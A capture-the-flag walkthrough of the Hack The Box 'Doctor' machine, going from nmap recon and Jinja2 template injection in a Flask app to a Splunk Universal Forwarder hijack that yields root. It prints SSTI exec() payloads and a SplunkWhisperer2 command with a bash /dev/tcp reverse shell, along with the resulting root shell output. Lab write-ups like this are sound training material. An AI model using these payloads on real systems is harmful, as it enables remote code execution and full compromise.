# Hack The Box : Doctor ( Easy - Linux )

![intro](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Boxes/htb-doctor/images/htb-doctor-card.jpg "HTB: Doctor")

> Doctors are good with injections!

## Overview (TL;DR):

* Nmap scan to find SSH, HTTP, and Splunkd.
* Domain name found in static HTML page.
* Flask web application + server side template injection = RCE.
* user `shaun`'s password in logs.
* Splunk Universal Forwarder Hijacking to `root`.

------------------------------------------------------------

## Initial Foothold:

### Nmap scan:

```shell
# Nmap 7.80 scan initiated Fri Oct  9 06:18:32 2020 as: nmap -sC -sV -oN nmap/initial.nmap -A -p- -v 10.10.10.209
Nmap scan report for 10.10.10.209
Host is up (0.11s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-06T15:57:27
| Not valid after:  2023-09-06T15:57:27
| MD5:   db23 4e5c 546d 8895 0f5f 8f42 5e90 6787
|_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), Linux 2.6.32 (88%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 3.10 - 4.11 (86%), Linux 3.11 (86%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 38.908 days (since Mon Aug 31 08:34:00 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=251 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   145.19 ms 10.10.16.1
2   145.34 ms 10.10.10.209

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct  9 06:21:27 2020 -- 1 IP address (1 host up) scanned in 176.03 seconds
```

A lot of information is given because I used flags like `-sC` to use default scripts and `-sV` to enumerate versions of the services. Also, for aggressive scans _grrr!_ `-A` is used mainly for OS detection, version detection, script scanning, and traceroute.

Only 3 ports are open: SSH on 22, HTTP on 80, and `Splunk` on 8089.


### HTTP Recon:

Going to the URL `http://10.10.10.209`, you'll be greeted with a static HTML page. 

![static](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Boxes/htb-doctor/images/static-page-with-domain.PNG "Something is interesting here")

I tend not to use `dirbuster` or any directory fuzzing tools in CTFs, because that's usually not the intended route. Instead, I take a quick look at the source code. 

Even though it is staring right at our face... 

`info@doctors.htb` is a domain email address where the domain is `doctors.htb`. Whenever you catch a domain, make sure to map the IP address to the domain in the `/etc/hosts` file; sometimes you will get an entirely different website when you visit that domain.


```shell
127.0.0.1       localhost
127.0.1.1       kali

10.10.10.209    doctors.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

Now, let's visit the URL `http://doctors.htb/`...

![New web app!](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Boxes/htb-doctor/images/doctor-secure-messaging.PNG "New web app!")

An entirely new web application appears where there is a login function and a register option. So, let's try to register a new user!

![register](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Boxes/htb-doctor/images/doctor-secure-messaging-register.PNG "Register!")

After being done with the registeration, we will be redirected back to the login page with a prompt saying that our account is only going to live for 20 minutes... _RIP_ gotta act like sonic and *be fast!*, or just re-create the account!

![img](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Boxes/htb-doctor/images/doctor-secure-messaging-login.PNG "20 MINS!!!")

There is a browser plugin called [wappalyzer](https://www.wappalyzer.com/) that helps identify technologies used in websites... sometimes!... Using that plugin, we can identify that the server is using python `Flask`.

![wappalyzer](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Boxes/htb-doctor/images/wappalizer-output.PNG "woh!")

After logging in, we can see that there is an option to view our `account` and an option to create a `new message`; creating a new message sounds promising. 

![new message](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Boxes/htb-doctor/images/doctor-secure-messaging-new-message.PNG "yay new message")

Putting anything in the message will display it as it is in the `/post/<num here>` part of the webpage. Here we can start looking at the website's source code; we will find a commented out HTML tag.

```html
<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
```

There's an archive directory that is apparently under beta testing. So, it's still under development! 

Navigating to `http://doctors.htb/archive` will result in a white page. However, if we view the source, we can find some entries that appear to be our message's title, which we have created earlier.

```XML
	<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item>
     <title>hello</title>
     </item>
		</channel>
```

So, from this enumeration, we can get the following juicy info:
 1. Under development `/archive` directory
 2. Web application is running on `Flask` Web framework
 3. Our accounts only last for 20 mins
 >BONUS TIP: you can check my other CTF [writeup](https://freezeluiz.github.io/CTF-Writeups/sector443ctf-iknowsecret.html) if you want to gain the admin's account. 😉
 
That is all we need to get to the next step!


### Server Side Template Injection:

Normally in an SSTI, the HTML form will take the user input and it will render a new page with that input as a parameter. However, this box comes with a twist; the reflected user input is not in the `/posts` directory, but it's in the _under development_ directory `/archive`.

As I was searching for SSTI payloads, I found a couple of good articles to read. I will be using this [one](https://shubham-singh.me/posts/server-side-template-injection/) as the main source in this phase.

The boilerplate way of identifying SSTI is the payload `{{7*7}}`, which will be evaluated if the user input was directly inserted into the template renderer.

Let's create a `new message` with that payload and see if it will be reflected or not...

![SSTI1](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Boxes/htb-doctor/images/doctor-template-injection-attempt.PNG "SSTI Payload")

It did not reflect directly on the main page; however, if we check the `/archive` directory...

![SSTI2](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Boxes/htb-doctor/images/doctor-template-injection-poc.PNG "SSTI PoC")

_WOOT!_ We will get the reflected input. The next thing to do is to get RCE. But how? We'll use `Python Objects and Modules`.

```
self.__init__ --> Is used to construct a new instance of the Jinja class, used as the base point of our payload.

__globals__ --> It is used to focus on the entire namespace of that python object that we just initiated.

__builtins__ --> It is a module containing the built-in functions and types. So, we can directly access most of the modules provided by python from here.

Payload = {{self.__init__.__global__.__builtins__}}
```

Using that payload, we will have a list of python builtin functions that we can access using that object.

![exec](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Boxes/htb-doctor/images/exec-template-injection.PNG "We have exec()")

_The font maybe a bit small_; however, we can gain access to the `exec()` function, which lets us execute arbitrary python code.

```python
{{ self.__init__.__globals__.__builtins__.exec("""PYTHON CODE TO EXECUTE!""") }}
```

If we get a python reverse shell [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) and add it in the `exec()` function, we will be able to get our foothold. 

------------------------------------------------------------

## Path to user `shaun`:

### Enumeration:

![id](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Boxes/htb-doctor/images/1st-user-web.PNG "We are user Web")

I like to use enumeration scripts. They do the default enumeration commands quickly and display them beautifully. One of the most common ones for linux is [linpeas](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS). Running that script will reveal a password hidden in the `apache2 log` directory.

![passwd](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Boxes/htb-doctor/images/shaun-password.PNG "Rock 'n' Roll!")

If you list the directories in `/home`, you will see that there is a user called `shaun`. If you try to use `su shaun` and copy-paste that password, you will be `shaun` and you can read the `user.txt` from `/home/shaun/user.txt`

>Onward ye old hacker!

------------------------------------------------------------

## Path to root:

### Enumeration:

Do you remember the `Splunk` service that we saw in the nmap scan? Yeah, let's take a look at that.

If you type in the URL of a browser `10.10.10.209:8089`, you will see that you have to accept an SSL certificate. Go ahead and accept it! You'll then be redirected to the `Splunkd` web page.

![img](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Boxes/htb-doctor/images/doctor-splunkd-webpage.PNG "What the splunk!?")

If you try to check the `services` tab, you'll be required to authenticate. The only set of credentials that we have is `shaun:Guitar123`; if you try that set, you'll get in.

Moreover, if you run `ps aux | grep splunk` on the box, you'll see that `splunk` is running as root. So, it's worth checking for a privilege escalation route from this service.

```
root        1132  0.3  2.5 294628 102292 ?       Sl   Okt17   6:13 splunkd -p 8089 start
root        1134  0.0  0.3  77664 15620 ?        Ss   Okt17   0:00 [splunkd pid=1132] splunkd -p 8089 start [process-runner]
```

### Splunk Universal Forwarder (UF) Hijacking:

After searching for a while on google, I came across this particular [blog](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/) post along with its referenced github.

This blog is explaining a technique that temporarily changes the `Splunk UF` settings to make it use an attacker controlled server, allowing the attacker to deploy any malicious application to be run as the user running the `Splunk` service. 

Copy the code into your own python script or clone the repo, and run the script providing a reverse-shell payload from [`PayloadAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp).

>Don't forget to setup the listener!

```shell
$ python3 ape.py --host 10.10.10.209 --lhost 10.10.xx.xx --username 'shaun' --password 'Guitar123' --payload 'bash -c "bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1"' --payload-file "runme.sh"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpjfongrmj.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.xx.xx:8181/
10.10.10.209 - - [18/Oct/2020 14:03:31] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup
```

```shell
kali@kali:~/Documents/HackTheBox/doctor$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.10.209] 54856
bash: cannot set terminal process group (1134): Inappropriate ioctl for device
bash: no job control in this shell
root@doctor:/# id && uname -a 
id && uname -a
uid=0(root) gid=0(root) groups=0(root)
Linux doctor 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
root@doctor:/#
```
GG!

🤘💀🤘
